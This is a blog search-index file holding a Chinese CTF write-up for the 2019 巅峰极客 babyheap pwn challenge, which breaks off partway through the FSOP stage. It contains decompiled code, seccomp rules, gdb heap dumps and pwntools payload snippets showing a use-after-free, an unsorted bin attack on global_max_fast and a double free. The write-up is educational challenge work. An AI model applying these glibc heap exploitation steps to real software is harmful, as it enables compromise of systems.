<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[巅峰极客2019 pwn writeUp]]></title>
      <url>/2019/10/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-writeUp/</url>
      <content type="html"><![CDATA[<p>巅峰极客的时间恰好和360个人赛重了，就先打了360，结果打完360之后脑袋受不了了……</p>
<p>不过这道题也真挺难的……佩服当场做出的师傅们</p>
<p>所有题目都在：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/top_geek/pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>保护全开，话说现在的题一般都全开了吧……</p>
<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>经典的菜单题，但是有特殊的地方</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_CA0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rt1</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v0 = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);      <span class="comment">//打开了urandom，获取到了文件描述符</span></span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"get random fail"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = v0;</span><br><span class="line">  qword_2020B0 = (__int64)&amp;v0[<span class="number">-1</span>]._unused2[<span class="number">4</span>];  <span class="comment">//把不知道什么给了qword_2020B0</span></span><br><span class="line">  stream = v0;  <span class="comment">//把文件描述符给了全局变量stream</span></span><br><span class="line">  setvbuf(v0, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !fread(&amp;v7, <span class="number">1u</span>LL, <span class="number">8u</span>LL, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read random fail"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = (<span class="keyword">void</span> *)(v2 &amp; <span class="number">0xFFFF0000</span>);</span><br><span class="line">  qword_2020B8 = (__int64)mmap(v3, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( v3 != (<span class="keyword">void</span> *)qword_2020B8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"mmap fail!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) )  <span class="comment">//声明沙箱规则</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Could not start seccomp!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;unk_202070);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">-1</span> || (<span class="built_in">puts</span>(<span class="string">"welcome to babyheap!!!"</span>), v6 = __readfsqword(<span class="number">0x28</span>u), result = v6 ^ v8, v6 != v8) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Could not start seccomp2!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目在整个菜单程序开始的时候，做了这么多事情，最主要就是把urandom的文件描述符给了全局变量stream，以及声明了沙箱。</p>
<p>一般看见prctl函数大概就知道，它不让getshell，只能通过orw或者其他类似于数组经济线上的那种方式……</p>
<p>看一下沙箱规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x04 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0008</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>很明显了，orw</p>
<h2 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h2><ol>
<li>Add note</li>
<li>Delete note</li>
<li>Show note</li>
<li>Change</li>
<li>Exit</li>
</ol>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在delete函数中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int sub_1000()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rbx</span><br><span class="line">  unsigned __int64 v1; // rax</span><br><span class="line">  void *v2; // rdi</span><br><span class="line"></span><br><span class="line">  v0 = qword_2020B8;</span><br><span class="line">  puts(&quot;input your index:&quot;);</span><br><span class="line">  v1 = sub_E60(&quot;input your index:&quot;);</span><br><span class="line">  if ( v1 &gt; 0xF || (v2 = *(void **)(v0 + 16 * v1 + 8)) == 0LL )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range or note not exist&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  free(v2);     //漏洞点</span><br><span class="line">  return puts(&quot;note delete success!!!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，虽然是这么简单的漏洞，它却在add函数以及change函数中给了限制，让漏洞更难被利用</p>
<hr>
<p>在add函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( v3 &lt;= <span class="number">0x7F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">v5 = <span class="built_in">malloc</span>(v3); <span class="comment">//v3是size</span></span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)v5 &lt; qword_2020B0 || (<span class="keyword">unsigned</span> __int64)v5 &gt; qword_2020B0 + <span class="number">0x600</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are bad"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>它限制堆块大小必须大于0x7f，即不能申请fastbin</p>
<p>同时它又限制申请的堆块不能离0x2020b0这个偏移存的地址相差0x600，而0x2020b0是堆块的基地址</p>
<hr>
<p>在change函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(v3, <span class="number">1u</span>LL, *v2, stream);   <span class="comment">//v3是堆地址，*v2是size</span></span><br></pre></td></tr></table></figure>

<p>它是从stream往堆里读size个数据，stream是urandom的文件描述符，结果就导致根本没法用change这个函数来做什么有用的事情</p>
<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>在我动调的过程中，我发现在内存里早就分配了一个size为0x230的堆块，这个堆块的地址是堆的基地址，<code>_IO_list_all</code>里面存的指针也指向了这个块</p>
<p>这就意味着，该堆块是一个<code>_IO_FILE</code>结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x55bda3f43000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 561, </span><br><span class="line">  fd = 0xfbad248b, </span><br><span class="line">  bk = 0x55bda3f43093, </span><br><span class="line">  fd_nextsize = 0x55bda3f43093, </span><br><span class="line">  bk_nextsize = 0x55bda3f43093</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来在队友的帮助下，我终于耗时半天多做出来这道题了……QAQ</p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="利用malloc-consolidate以及unsorted-attack来覆盖global-max-fast"><a href="#利用malloc-consolidate以及unsorted-attack来覆盖global-max-fast" class="headerlink" title="利用malloc_consolidate以及unsorted attack来覆盖global_max_fast"></a>利用malloc_consolidate以及unsorted attack来覆盖global_max_fast</h2><p>申请如下格式</p>
<pre><code>|idx|size|
|:--:|:--:|
|0|0x90|
|1|0x90|
|2|0x90|
|3|0x90|
|7|0xf0|
|8|0xf0|</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x559b8d502230:	0x00007f0472a04260	0x0000000000000091  &lt;- 0</span><br><span class="line">0x559b8d502240:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x559b8d502250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022c0:	0x0000000000000000	0x0000000000000091  &lt;- 1</span><br><span class="line">0x559b8d5022d0:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x559b8d5022e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502310:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502320:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502350:	0x0000000000000000	0x0000000000000091  &lt;- 2</span><br><span class="line">0x559b8d502360:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x559b8d502370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>先<code>free(2)</code>，再<code>free(0)</code>，然后再<code>show(0)</code>，就可以leak出heap的地址</p>
<p>然后再<code>free(1)</code>，此时就会触发<code>malloc_consolidate</code>，使这三个块合并成一个大块，size为0x1b0</p>
<p>此时<code>show(0)</code>就可以得到libc的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x55bda3f43230:	0x00007f0a92415260	0x00000000000001b1  &lt;- 0</span><br><span class="line">0x55bda3f43240:	0x00007f0a92416b78	0x00007f0a92416b78</span><br><span class="line">0x55bda3f43250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432c0:	0x0000000000000090	0x0000000000000090  &lt;- 1</span><br><span class="line">0x55bda3f432d0:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x55bda3f432e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43310:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43320:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43350:	0x0000000000000000	0x0000000000000091  &lt;- 2</span><br><span class="line">0x55bda3f43360:	0x00007f0a92416b78	0x00007f0a92416b78</span><br><span class="line">0x55bda3f43370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>此时构造</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) \</span><br><span class="line">    + <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br></pre></td></tr></table></figure>

<p>然后再<code>add(4, 0x1a0, payload)</code>，就可以得到前面那个合并的块，并把块的内容填充为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x55e319de3230:	0x00007f99fd61e260	0x00000000000001b1  &lt;- 0 4</span><br><span class="line">0x55e319de3240:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3250:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3260:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3270:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3280:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32c0:	0x0000000000000000	0x0000000000000091  &lt;- 1</span><br><span class="line">0x55e319de32d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3300:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3310:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3320:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3330:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3340:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3350:	0x0000000000000000	0x0000000000000021  &lt;- 2</span><br><span class="line">0x55e319de3360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de3370:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55e319de3380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de3390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p><code>payload</code>将块1的size的<code>prev_inuse</code>置1，并将其下的块的size变为0x21，以及在块2中又构造了个size为0x21的小块</p>
<p>这样做的目的是为了绕过<code>malloc_consolidate</code>的检测，即检测块1的下一块的下一块的<code>prev_inuse</code>来确认块1的下一块是否被使用，如果是，则不管，如果否，则合并，合并的时候就会触发其他操作导致出错</p>
<p><code>free(4)</code>，再<code>free(1)</code> b，此时块1就位于unsortedin中了</p>
<p>接下来</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">5</span>, <span class="number">0x1a0</span>, <span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(leak)+p64(leak + <span class="number">0x1c70</span>))</span><br></pre></td></tr></table></figure>

<p>leak是leak出来的libc的地址，为<code>main_arena+88</code></p>
<p>这样又把大块分配了出来，此时内存格局为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x55b1bc2d3230:	0x00007fef77c65260	0x00000000000001b1  &lt;- 0 4 5</span><br><span class="line">0x55b1bc2d3240:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3250:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3260:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3270:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3280:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32c0:	0x0000000000000000	0x0000000000000091  &lt;- 1</span><br><span class="line">0x55b1bc2d32d0:	0x00007fef77c66b78	0x00007fef77c687e8  &lt;- &amp;global_max_fast-0x10</span><br><span class="line">0x55b1bc2d32e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3300:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3310:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3320:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3330:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3340:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3350:	0x0000000000000090	0x0000000000000020  &lt;- 2</span><br><span class="line">0x55b1bc2d3360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d3370:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b1bc2d3380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d3390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>块1的bk就被改成了<code>&amp;global_max_fast-0x10</code>，同时，<code>unsorted bin</code>指向的也是块1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x55b1bc2d32c0 —▸ 0x7fef77c66b78 (main_arena+88) ◂— 0x55b1bc2d32c0</span><br><span class="line">BK: 0x55b1bc2d32c0 —▸ 0x7fef77c687e8 (free_list) ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>这时再<code>add(6, 0x80, &#39;abc&#39;)</code>就会触发<code>unsorted bin attack</code>，将<code>global_max_fast</code>修改</p>
<p>到此，攻击<code>global_max_fast</code>就完成了</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>做题的时候官方给出过提示，vtable fake</p>
<p>还记得最开始添加的块7和块8么，现在就派上用场了，用他们来<code>double free</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>为了控制程序流程，我们要控制<code>_IO_list_all</code>，结果就发现<code>_IO_list_all</code>所指就在堆上，堆的基址处，然后又在<code>heap_base + 0x13</code>的地方发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x55b1bc2d3000+0x13</span><br><span class="line">0x55b1bc2d3013:	0x2d309300000000fb</span><br></pre></td></tr></table></figure>

<p>因为检查size的时候只取最后四个字节，所以这里完全可以作为一个size为0xf0的块的size</p>
<p>所以，<code>heap_addr = heap_base + 0x13 - 0x8</code></p>
<p>将块用<code>double free</code>分配到<code>heap_addr</code></p>
<p><code>double free</code>的同时会产生两个块，由于题目所给空间比较小，因此要将这两个块一并用上</p>
<p>我的思路是，覆盖<code>_IO_FILE_</code>的<code>_chain</code>为堆地址，然后在产生的两个块上分别构造<code>fake_io_struct</code>以及<code>ropchain</code></p>
